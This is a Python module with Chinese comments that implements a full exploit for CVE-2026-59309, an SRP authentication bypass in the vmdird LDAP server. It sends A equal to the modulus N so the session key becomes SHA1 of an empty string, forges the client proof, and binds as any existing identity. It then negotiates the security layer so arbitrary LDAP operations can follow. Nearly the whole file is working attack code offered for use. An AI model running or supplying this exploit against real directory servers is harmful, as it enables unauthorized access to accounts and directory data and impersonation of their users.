"""CVE-2026-59309 — vmdird Cyrus SASL SRP 认证绕过。

格式与 cyrus-sasl 2.1.26 plugins/srp.c（$Id 1.59）逐条对齐：
  缓冲 = 4B BE 长度 + 字段；%m=2B len+MPI  %o=1B len+octets
         %s=2B len+utf8   %u=4B BE

漏洞：srp_server_mech_step2 仅校验 A <= 0，未按 RFC5054 §3.1 校验
A ≡ 0 (mod N)。发送 A = N ⇒
  服务端 u = H(A|B)，S = (v^u · A)^b mod N = 0
  K = SHA1(bytes(S)) = SHA1(b"")  —— 公开常量
  M1 输入全部公开/自选 ⇒ 伪造 M1 通过 bind，并以任意存在身份操作 LDAP。

[协议保真] 本模块的 SHA-1 / HMAC-SHA1 / AES-128-OFB 是被测协议的固定
算法套件，不是本工具的安全选择，替换将导致协议不兼容。
"""
import hashlib
import hmac
import secrets
import struct

from .aes128 import AES128OFB
from .berldap import (LDAPConn, op_bind_sasl, parse_bind_response,
                      connect_ldap)  # noqa: F401  (re-export convenience)
from .util import i2b, be32, SHA1_EMPTY


def srp_mpi(x):
    b = i2b(x)
    return struct.pack(">H", len(b)) + b


def srp_os(b):
    if len(b) > 255:
        raise ValueError("octet sequence too long for SRP buffer (%d)" % len(b))
    return bytes([len(b)]) + b


def srp_s(x):
    if isinstance(x, str):
        x = x.encode()
    return struct.pack(">H", len(x)) + x


def srp_frame(payload):
    return struct.pack(">I", len(payload)) + payload


class SRPUnpack:
    def __init__(self, data):
        self.d = data
        self.o = 0

    def c(self):
        v = self.d[self.o]
        self.o += 1
        return v

    def mpi(self):
        (n,) = struct.unpack_from(">H", self.d, self.o)
        self.o += 2
        v = int.from_bytes(self.d[self.o:self.o + n], "big")
        self.o += n
        return v

    def os(self):
        n = self.d[self.o]
        self.o += 1
        v = self.d[self.o:self.o + n]
        self.o += n
        return v

    def s(self):
        (n,) = struct.unpack_from(">H", self.d, self.o)
        self.o += 2
        v = self.d[self.o:self.o + n]
        self.o += n
        return v

    def u32(self):
        (v,) = struct.unpack_from(">I", self.d, self.o)
        self.o += 4
        return v


def parse_server_options(L):
    """解析服务端选项串（大小写不敏感，FindBit 同为不敏感）。"""
    so = {"mda": [], "replay": False, "integrity": [], "conf": [],
          "mandatory": set(), "maxbuf": None, "raw": L}
    for tok in L.split(","):
        tok = tok.strip()
        if not tok:
            continue
        low = tok.lower()
        if low.startswith("mda="):
            so["mda"].append(low[4:])
        elif low == "replay_detection":
            so["replay"] = True
        elif low.startswith("integrity="):
            so["integrity"].append(low[10:].replace("hmac-", ""))
        elif low.startswith("confidentiality="):
            so["conf"].append(low[16:])
        elif low.startswith("mandatory="):
            so["mandatory"].add(low[10:])
        elif low.startswith("maxbuffersize="):
            try:
                so["maxbuf"] = int(low[14:])
            except ValueError:
                pass
    return so


# 本工具实现的算法白名单（与 SRPLayer/aes128 的硬编码实现一致）。
# srp.c 的 cipher_options 表序 DES 在 AES 之前，若照抄"第一个通告算法"
# 会协商出本工具不支持的 confidentiality=des —— 必须白名单过滤。
SUPPORTED_MDA = ("sha-1",)
SUPPORTED_INTEGRITY = ("sha-1",)
SUPPORTED_CONF = ("aes",)


def decide_client_options(so, policy="auto"):
    """
    依据服务端通告决定客户端选项串（决定 M2 与安全层）。
      auto / full : 满足 mandatory，从白名单中选可用组合；
                    需要的层不在白名单内时返回 None（fail-fast，
                    避免 bind 成功后安全层失步）
      plain       : 空选项（无安全层，明文 LDAP）——服务端有 mandatory 时不可行
    服务端 ParseOptionString(isserver=1) 对未通告选项直接报错，
    因此只下发服务端通告过且本工具支持的算法名。
    """
    if policy == "plain":
        return "" if not so["mandatory"] else None
    parts = []
    if so["mda"]:
        mda = next((m for m in so["mda"] if m in SUPPORTED_MDA), None)
        if mda is None:
            return None
        parts.append("mda=" + mda)
    want_conf = ("confidentiality" in so["mandatory"]) or bool(so["conf"])
    want_int = want_conf or ("integrity" in so["mandatory"]) or \
               ("replay_detection" in so["mandatory"]) or bool(so["integrity"])
    if want_int:
        integ = next((i for i in so["integrity"] if i in SUPPORTED_INTEGRITY), None)
        if integ is None:
            return None
        parts.append("integrity=hmac-" + integ)
        if so["replay"]:
            parts.append("replay_detection")
    if want_conf:
        conf = next((c for c in so["conf"] if c in SUPPORTED_CONF), None)
        if conf is None:
            return None
        parts.append("confidentiality=" + conf)
    return ",".join(parts)


class SRPLayer:
    """srp.c srp_encode/srp_decode 的客户端侧镜像。
    帧 = 4B BE 长度 + [AES-128-OFB 密文|明文] + [HMAC-SHA1(20B)]
    HMAC 覆盖 密文 + (replay ? 4B BE 序号 : ∅)，密钥为完整 20B K。
    客户端：加密 IV = sIV，解密 IV = cIV（与 srp.c 两次 LayerInit 调用一致）。
    """

    def __init__(self, K, cIV, sIV, integrity, replay, confidentiality):
        self.K = K
        self.seq_out = 0
        self.seq_in = 0
        self.integ = integrity
        self.replay = replay
        self.conf = confidentiality
        if self.conf:
            self.enc = AES128OFB(K[:16], sIV)
            self.dec = AES128OFB(K[:16], cIV)

    def _mac(self, body, seq):
        h = hmac.new(self.K, body, hashlib.sha1)
        if seq is not None:
            h.update(be32(seq))
        return h.digest()

    def wrap(self, pdu):
        body = self.enc.crypt(pdu) if self.conf else pdu
        if self.integ:
            body += self._mac(body, self.seq_out if self.replay else None)
            if self.replay:
                self.seq_out += 1
        return be32(len(body)) + body

    def unwrap(self, data):
        if self.integ:
            body, mac = data[:-20], data[-20:]
            calc = self._mac(body, self.seq_in if self.replay else None)
            if not hmac.compare_digest(calc, mac):
                raise ValueError("安全层 HMAC 校验失败（序列/密钥不同步？）")
            if self.replay:
                self.seq_in += 1
        else:
            body = data
        return self.dec.crypt(body) if self.conf else body


def _strip_len_prefix(creds):
    """vmdird（Likewise 分叉）的 SASL credentials 收发都带一层 4B BE 长度
    前缀（值 = len-4，实测 2026-10 真实目标 821B = 4 + 817）；srp.c 原生
    格式无此前缀。匹配则剥掉，不匹配原样返回。"""
    if len(creds) >= 4:
        outer = int.from_bytes(creds[:4], "big")
        if outer == len(creds) - 4:
            return creds[4:]
    return creds


def parse_server_challenge(creds):
    """解析 step1 挑战 { 0x00 mpi(N) mpi(g) os(s) mpi(B) utf8(L) }。

    兼容三种布局：vmdird 的 4B 长度前缀包裹、srp.c 原生（带前导 0x00
    reuse 标志）、以及无前导字节的变体。全部字段通过合理性校验才接受，
    失败抛 ValueError（含前 32 字节 hex 供诊断）。
    """
    candidates = [_strip_len_prefix(creds), creds]
    errs = []
    seen = []
    for base in candidates:
        if base in seen:
            continue
        seen.append(base)
        for skip in (0, 1):
            try:
                u = SRPUnpack(base)
                u.o = skip
                N = u.mpi()
                g = u.mpi()
                salt = u.os()
                B = u.mpi()
                L = u.s()
                if not 64 <= N.bit_length() <= 8192:
                    raise ValueError("N 位数异常(%d)" % N.bit_length())
                if g <= 1 or g >= N:
                    raise ValueError("g 异常(%d)" % g)
                if not 0 < len(salt) <= 128:
                    raise ValueError("salt 长度异常(%d)" % len(salt))
                if not 1 <= B.bit_length() <= N.bit_length():
                    raise ValueError("B 位数异常(%d)" % B.bit_length())
                if len(base) - u.o > 4:
                    raise ValueError("尾部多余 %d 字节" % (len(base) - u.o))
                return N, g, salt, B, L
            except Exception as e:
                errs.append("pre=%s/off=%d: %s" %
                            ("4Blen" if base is not creds else "raw", skip, e))
    raise ValueError("SRP 挑战解析失败（%d B，头 32B: %s）：%s" %
                     (len(creds), creds[:32].hex(), " | ".join(errs)))


class BypassResult:
    def __init__(self, ok, msg, info=None):
        self.ok = ok
        self.msg = msg
        self.info = info or {}


def _sasl_bind_round(conn, creds):
    conn.send_op(op_bind_sasl(b"SRP", creds))
    _, tag, val = conn.recv_op()
    if tag != 0x61:
        raise ConnectionError("非 BindResponse 响应 (tag=0x%02x)" % tag)
    return parse_bind_response(val)


def srp_bypass_bind(conn, identity, policy="auto", log=lambda s: None):
    """
    在已连接的 LDAPConn 上执行 CVE-2026-59309 SRP 认证绕过。
    成功后 conn.layer 就绪，可执行任意 LDAP 操作。
    """
    try:
        return _srp_bypass_bind(conn, identity, policy, log)
    except (ValueError, struct.error, ConnectionError, OSError,
            IndexError) as e:
        return BypassResult(False, "协议错误: %s" % e)


def _srp_bypass_bind(conn, identity, policy="auto", log=lambda s: None):
    ident = identity.encode()

    # --- 步骤 1：{ utf8(U) utf8(I) utf8(sid) os(cn) } ---
    t1 = srp_frame(srp_s(ident) + srp_s(ident) + srp_s(b"") + srp_os(b""))
    code, diag, creds = _sasl_bind_round(conn, t1)
    if code != 14 or not creds:
        # 回退：部分实现不接受首包携带初始响应（code=2 protocolError / 未响应）
        if code in (2, None):
            code, diag, creds = _sasl_bind_round(conn, None)
        if code != 14 or not creds:
            d = diag.decode("utf-8", "replace")
            if "no secret" in d.lower():
                return BypassResult(False, "身份不存在或无 SRP verifier：%s" % d)
            return BypassResult(False,
                                "SRP 第一步未获挑战 (code=%s diag=%s)" % (code, d))

    # --- 解析 { 0x00 mpi(N) mpi(g) os(s) mpi(B) utf8(L) }（偏移探测，兼容 vmdird）---
    try:
        N, g, salt, B, L_raw = parse_server_challenge(creds)
    except ValueError as e:
        return BypassResult(False, str(e))
    L = L_raw.decode("utf-8", "replace")
    so = parse_server_options(L)
    log("[*] 服务端 SRP 参数: N=%d bit, g=%d, salt=%d B" % (N.bit_length(), g, len(salt)))
    log("[*] 服务端选项 L: %s" % L)

    opts_str = decide_client_options(so, policy)
    if opts_str is None:
        return BypassResult(
            False,
            "无法协商出本工具支持的安全层组合（需要 mda=SHA-1 / integrity=HMAC-SHA-1 / "
            "confidentiality=AES；服务端通告：%s）。若服务端未强制层可尝试 plain 策略。"
            % (L or "(空)"))

    # --- CVE-2026-59309 核心：A = N ⇒ S = (A·v^u)^b mod N = 0 ⇒ K = SHA1("") ---
    A = N
    K = SHA1_EMPTY
    Ng = bytes(a ^ b for a, b in zip(hashlib.sha1(i2b(N)).digest(),
                                     hashlib.sha1(i2b(g)).digest()))
    M1 = hashlib.sha1(
        Ng
        + hashlib.sha1(ident).digest()       # H(U)
        + salt
        + i2b(A)                              # bytes(A)
        + i2b(B)                              # bytes(B)
        + K
        + hashlib.sha1(ident).digest()       # H(I)（与服务端 text->userid 一致）
        + hashlib.sha1(L_raw).digest()        # H(L)（服务端选项串原文 bytes）
    ).digest()

    cIV = secrets.token_bytes(16)
    t2 = srp_frame(srp_mpi(A) + srp_os(M1) + srp_s(opts_str) + srp_os(cIV))
    code, diag, creds = _sasl_bind_round(conn, t2)
    if code != 0:
        d = diag.decode("utf-8", "replace")
        if "A mod N" in d or "Illegal value" in d:
            return BypassResult(False,
                                "目标已修复：服务端存在 A ≡ 0 (mod N) 校验（%s）" % d)
        if code == 2:
            return BypassResult(
                False,
                "bind 被拒 code=2(protocolError)：%s —— 补丁版常不回显细节，"
                "结合版本核对判断是否已修复" % d)
        return BypassResult(False,
                            "bind 失败 code=%s diag=%s（若 M1 不匹配：身份可能不存在"
                            "或服务端 MDA 非 SHA-1）" % (code, d))
    if not creds:
        return BypassResult(False, "bind 成功但缺少服务器证据 M2，无法协商安全层")

    # --- 解析 { os(M2) os(sIV) utf8(sid) uint(ttl) } 并验证（防伪服务器）---
    # vmdird 响应同样带 4B 长度前缀，先剥（_strip_len_prefix 不匹配则原样）
    u2 = SRPUnpack(_strip_len_prefix(creds))
    M2, sIV, sid, ttl = u2.os(), u2.os(), u2.s(), u2.u32()
    myM2 = hashlib.sha1(
        i2b(A) + M1 + K
        + hashlib.sha1(ident).digest()
        + hashlib.sha1(opts_str.encode()).digest()
        + sid + be32(ttl)
    ).digest()
    if not hmac.compare_digest(myM2, M2):
        return BypassResult(False, "服务器证据 M2 校验失败（K/选项推导不一致）")

    low = opts_str.lower()
    integrity = "integrity=" in low
    conf = "confidentiality=" in low
    replay = "replay_detection" in low
    if integrity or conf:
        conn.layer = SRPLayer(K, cIV, sIV, integrity, replay, conf)

    return BypassResult(True, "SRP 认证绕过成功，已以 %s 身份绑定" % identity, {
        "identity": identity, "N_bits": N.bit_length(), "server_options": L,
        "client_options": opts_str or "(无)", "layer": opts_str or "(无安全层/明文)",
    })
